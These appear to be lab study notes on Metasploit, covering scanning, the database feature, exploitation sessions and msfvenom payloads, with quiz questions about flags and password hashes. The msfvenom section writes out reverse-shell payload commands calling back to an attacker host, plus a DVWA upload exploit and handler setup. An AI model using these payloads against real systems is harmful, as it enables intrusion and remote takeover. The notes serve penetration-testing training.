Introduction

The topics we will cover are:
1. How to scan target systems using Metasploit.
2. How to use the Metasploit database feature.
3. How to use Metasploit to conduct a vulnerability scan.
4. How to use Metasploit to exploit vulnerable services on target systems.
5. How msfvenom can be used to create payloads and obtain a Meterpreter session on the target system.


Scanning

Port Scanning: Metasploit has a number of modules to scan open ports on the target system and network. 
command: "search portscan" -> list potential port scanning modules available.

Port scanning modules will require you to set a few options:
1. CONCURRENCY: Number of targets to be scanned simultaneously.
2. PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
3. RHOSTS: Target or target network to be scanned.
4. THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.

Note: directly perform Nmap scans from the msfconsole prompt

Point to Remember: Number of modules make Metasploit a useful tool for the scanning phase.

UDP service Identification
The scanner/discovery/udp_sweep module will allow you to quickly identify services running over the UDP (User Datagram Protocol).
This module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

SMB Scans
Metasploit offers several useful auxiliary modules that allow us to scan specific services. . Especially useful in a corporate network would be smb_enumshares and smb_version

Point to Remember: When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).

Question 1: How many ports are open on the target system?
Question 2: Using the relevant scanner, what NetBIOS name can you see?
Question 3: What is running on port 8000?
Question 4: What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.

Note: perform tasks provided in activity file to get the solutions/answer to above question.

The Metasploit Database

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.

Note: need to do this if you are using Kali or have installed Metasploit yourself.
1. Start the PostgreSQL database, which Metasploit will use with the following command: systemctl start postgresql.
2. Initialize the Metasploit Database using the msfdb init command. However, trying to run msfdb init as root will give the following error message, "Please run msfdb as a non-root user." This can be solved by running it as the postgres account using sudo -u postgres msfdb init.

Point to Remember: If you are interested in repeating above steps, you will need to delete the existing database first using sudo -u postgres msfdb delete.

Checking DB status: launch msfconsole and check the database status using the db_status command.
The database feature will allow you to create workspaces to isolate different projects. 
Listing workspaces: list available workspaces using the workspace command.
Adding and Deleting workspaces: add a workspace using the -a parameter or delete a workspace using the -d parameter, respectively. 

Note: The * symbol indicates the currently used workspace.

Navigate b/w workspace: use the workspace command to navigate between workspaces simply by typing workspace followed by the desired workspace name.
workspace Help: use the workspace -h command to list available options for the workspace command.

Note: Different from regular Metasploit usage, once Metasploit is launched with a database, the help command, you will show the Database Backends Commands menu.

db_nmap command: If you run a Nmap scan using the db_nmap shown below, all results will be saved to the database.
Hosts and Services: reach information relevant to hosts and services running on target systems with the hosts and services commands, respectively. 
Help command(Hosts and Services): The hosts -h and services -h commands can help you become more familiar with available options.
Add RHOSTS parameter: Once the host information is stored in the database, you can use the hosts -R command to add this value to the RHOSTS parameter.

The services command used with the -S parameter will allow you to search for specific services in the environment.

Point to Remember:
In a typical penetration testing engagement, we could have the following scenario: 
1. Finding available hosts using the db_nmap command
2. Scanning these for further vulnerabilities or open ports (using a port scanning module) 

Look for the below exploits which are usually misconfigured 
You may want to look for low-hanging fruits such as:
HTTP: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
FTP: Could allow anonymous login and provide access to interesting files.
SMB: Could be vulnerable to SMB exploits like MS17-010
SSH: Could have default or easy to guess credentials
RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. 

Note: Metasploit has many features to aid in engagements such as the ability to compartmentalize your engagements into workspaces, analyze your results at a high level, and quickly import and explore data.


Vulnerability Scanning

Metasploit allows you to quickly identify some critical vulnerabilities that could be considered as “low hanging fruit”.  The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.

Point to Remember:
Finding vulnerabilities using Metasploit will rely heavily on your ability to scan and fingerprint the target. The better you are at these stages, the more options Metasploit may provide you.

Question 5: Who wrote the module that allows us to check SMTP servers for open relay?

Note: perform tasks provided in activity file to get the solutions/answer to above question.


Exploitation

Most of the exploits will have a preset default payload. However, you can always use the show payloads command to list other commands you can use with that specific exploit.
Once you have decided on the payload, you can use the set payload command to make your choice.

Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).
Some payloads will open new parameters that you may need to set, running the show options command once more can show these. As you can see in the above example, a reverse payload will at least require you to set the LHOST option.

You can background it using CTRL+Z or abort it using CTRL+C. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.

Working with sessions
The sessions command will list all active sessions. The sessions command supports a number of options that will help you manage sessions better.
You can interact with any existing session using the sessions -i command followed by the session ID.

Question 6: Exploit one of the critical vulnerabilities on the target VM
Question 7: What is the content of the flag.txt file?
Question 8: What is the NTLM hash of the password of the user "pirate"?

Note: perform tasks provided in activity file to get the solutions/answer to above question.


Msfvenom

Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.
Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

Output formats:
Either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). Themsfvenom --list formats command can be used to list supported output formats

Encoders:
As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the -e parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was raw.

Note: Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system.

Handlers:
Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. 
When using an exploit module, this part is automatically handled by the exploit module, you will remember how the payload options title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). 
The exploit steps are:
1. Generate the PHP shell using MSFvenom
2. Start the Metasploit handler
3. Execute the PHP shell

MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect.

Note: The reverse_shell.php file should be edited to convert it into a working PHP file. 

We will use Multi Handler to receive the incoming connection. The module can be used with the use exploit/multi/handler command.
Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
To use the module, we will need to set the payload value (php/reverse_php in this case), the LHOST, and LPORT values.
Once everything is set, we will run the handler and wait for the incoming connection.

When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.
If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.

Other Payloads:
Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. 
Below are a few examples you will often use:
In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.

Examples:
1. Linux Executable and Linkable Format (elf): msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
Note: The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.
2. Windows: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
3. PHP: msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
4. ASP: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
5. Python: msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py

Note: All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.

Question 9: What is the other user's password hash?

Note: perform tasks provided in activity file to get the solutions/answer to above question.

Summary
1. Better understanding of how Metasploit can help you identify potential vulnerabilities on target systems and exploit these vulnerabilities.
2. How the database feature can help you with penetration testing engagements where you have multiple potential targets.
3. Gained some experience with msfvenom and the creation of stand-alone Meterpreter payloads.